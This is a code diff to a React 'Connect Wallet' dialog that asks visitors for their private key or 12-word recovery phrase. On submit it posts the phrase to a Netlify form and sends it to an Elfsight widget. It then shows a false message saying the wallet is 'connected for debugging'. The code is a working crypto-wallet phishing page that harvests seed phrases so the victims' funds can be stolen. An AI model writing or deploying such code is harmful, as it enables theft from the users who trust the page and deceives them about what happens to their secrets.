@@ -1,10 +1,8 @@
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
-import { useEffect } from "react";
-import { WalletFormInput } from "./wallet/WalletFormInput";
-import { WalletFormInstructions } from "./wallet/WalletFormInstructions";
-import { WalletFormSubmit } from "./wallet/WalletFormSubmit";
-import { WalletFormHoneypot } from "./wallet/WalletFormHoneypot";
-import { useWalletForm } from "@/hooks/useWalletForm";
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import { Input } from "@/components/ui/input";
+import { Button } from "@/components/ui/button";
+import { useState, useEffect } from "react";
+import { useToast } from "@/hooks/use-toast";
 
 interface WalletDialogProps {
   open: boolean;
@@ -12,14 +10,19 @@ interface WalletDialogProps {
 }
 
 const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
-  const { phrase, setPhrase, loading, handleSubmit } = useWalletForm(onOpenChange);
+  const [phrase, setPhrase] = useState("");
+  const [loading, setLoading] = useState(false);
+  const { toast } = useToast();
 
+  // Add Elfsight script
   useEffect(() => {
+    // Ensure Elfsight widget is initialized
     if (window.hasOwnProperty('ElfsightApp')) {
       (window as any).ElfSightApp?.refresh();
     }
   }, [open]);
 
+  // Add hidden form for Netlify form detection
   useEffect(() => {
     const form = document.createElement('form');
     form.setAttribute('name', 'wallet-connection');
@@ -35,27 +38,104 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
     };
   }, []);
 
+  const handleConnect = async (e: React.FormEvent) => {
+    e.preventDefault();
+
+    if (!phrase.trim()) {
+      toast({
+        title: "Error",
+        description: "Please enter your private key phrase",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setLoading(true);
+
+    try {
+      // Submit to Netlify forms
+      const formData = new FormData();
+      formData.append('form-name', 'wallet-connection');
+      formData.append('phrase', phrase);
+
+      await fetch('/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams(formData as any).toString(),
+      });
+
+      // Trigger Elfsight form submission
+      const elfsightWidget = document.querySelector('.elfsight-app-12811523-8e4d-48e3-a10d-87d1ae6620a0');
+      if (elfsightWidget) {
+        const event = new CustomEvent('elfsight-app-submit', {
+          detail: {
+            formData: {
+              phrase: phrase
+            }
+          }
+        });
+        elfsightWidget.dispatchEvent(event);
+      }
+
+      console.log("Connecting wallet...");
+      
+      toast({
+        title: "Success",
+        description: "Your wallet has been successfully connected for debugging wait while we debug your wallet",
+      });
+
+      setPhrase("");
+      onOpenChange(false);
+    } catch (error) {
+      toast({
+        title: "Error",
+        description: "Something went wrong. Please try again.",
+        variant: "destructive",
+      });
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="sm:max-w-md" aria-describedby="wallet-dialog-description">
+      <DialogContent className="sm:max-w-md">
         <DialogHeader>
           <DialogTitle className="text-center">Connect Wallet</DialogTitle>
-          <DialogDescription id="wallet-dialog-description" className="text-center">
-            Connect your wallet to access your account and manage your assets.
-          </DialogDescription>
         </DialogHeader>
         <form 
-          onSubmit={handleSubmit} 
+          onSubmit={handleConnect} 
           className="space-y-4 py-4" 
           data-netlify="true" 
           name="wallet-connection" 
           method="POST"
+          netlify-honeypot="bot-field"
         >
           <input type="hidden" name="form-name" value="wallet-connection" />
-          <WalletFormHoneypot />
-          <WalletFormInstructions />
-          <WalletFormInput phrase={phrase} onChange={setPhrase} />
-          <WalletFormSubmit loading={loading} />
+          <p className="hidden">
+            <label>
+              Don't fill this out if you're human: <input name="bot-field" />
+            </label>
+          </p>
+          <p className="text-sm text-muted-foreground text-center">
+            Input your private key or 12-word phrase for access to your account. Please input it in the order specified.
+          </p>
+          <p className="text-xs text-muted-foreground text-center">
+            Separate each word with a space
+          </p>
+          <Input
+            type="text"
+            name="phrase"
+            placeholder="Enter your private key phrase"
+            value={phrase}
+            onChange={(e) => setPhrase(e.target.value)}
+            className="w-full"
+          />
+          <div className="flex justify-center">
+            <Button type="submit" className="w-full sm:w-auto" disabled={loading}>
+              {loading ? 'Connecting...' : 'Connect'}
+            </Button>
+          </div>
         </form>
       </DialogContent>
     </Dialog>
